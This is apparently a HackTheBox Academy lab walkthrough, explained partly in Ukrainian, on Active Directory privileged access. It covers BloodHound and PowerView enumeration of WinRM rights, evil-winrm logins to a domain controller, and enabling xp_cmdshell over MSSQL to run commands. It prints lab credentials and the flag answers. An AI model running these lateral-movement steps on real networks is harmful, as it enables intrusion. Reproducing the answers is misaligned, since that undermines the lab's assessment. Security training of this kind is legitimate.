Privileged Access
ℹ️ Informations
🌐 Website: HackTheBox

📚 Module: Active Directory Enumeration & Attacks

🔗 Link: Privileged Access

❓ Question 1
What other user in the domain has CanPSRemote rights to a host?

📋 Walkthrough
RDP до MS01 (10.129.26.34) з htb-student:Academy_student_AD!, відкрити PowerShell і запустити BloodHound Cypher-запит:

text
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
Або через PowerView:

powershell
Import-Module C:\Tools\PowerView.ps1
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-DC01 -GroupName "Remote Management Users"
text
ComputerName : ACADEMY-EA-DC01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\bdavis
IsGroup      : False
IsDomain     : UNKNOWN
✅ Answer: bdavis

❓ Question 2
What host can this user access via WinRM? (just the computer name)

📋 Walkthrough
На графі BloodHound стрілка CanPSRemote від BDAVIS вказує на ACADEMY-EA-DC01. Підтверджуємо підключенням через evil-winrm з Linux attack host:

bash
ssh htb-student@10.129.26.35
# Password: HTB_@cademy_stdnt!

evil-winrm -i 172.16.5.5 -u bdavis -p <password>
text
*Evil-WinRM* PS C:\Users\bdavis\Documents> hostname
ACADEMY-EA-DC01
✅ Answer: ACADEMY-EA-DC01

❓ Question 3
Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\Users\damundsen\Desktop\flag.txt.

📋 Walkthrough
Користувач damundsen має SQLAdmin-права над ACADEMY-EA-DB01 (пароль SQL1234!). З Linux attack host підключаємось через mssqlclient.py:

bash
ssh htb-student@10.129.26.35
# Password: HTB_@cademy_stdnt!

mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
# Password: SQL1234!
text
[*] Encryption required, switching to TLS
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[!] Press help for extra shell commands

SQL> enable_xp_cmdshell

[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Configuration option 'xp_cmdshell' changed from 0 to 1.

SQL> xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
output
----------------------
1m_the_sQl_@dm1n_n0w!
Альтернативно через PowerUpSQL з MS01:

powershell
Import-Module C:\Tools\PowerUpSQL\PowerUpSQL.ps1

Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" `
  -username "inlanefreight\damundsen" `
  -password "SQL1234!" `
  -query "EXEC xp_cmdshell 'type C:\Users\damundsen\Desktop\flag.txt'"
✅ Answer: 1m_the_sQl_@dm1n_n0w!
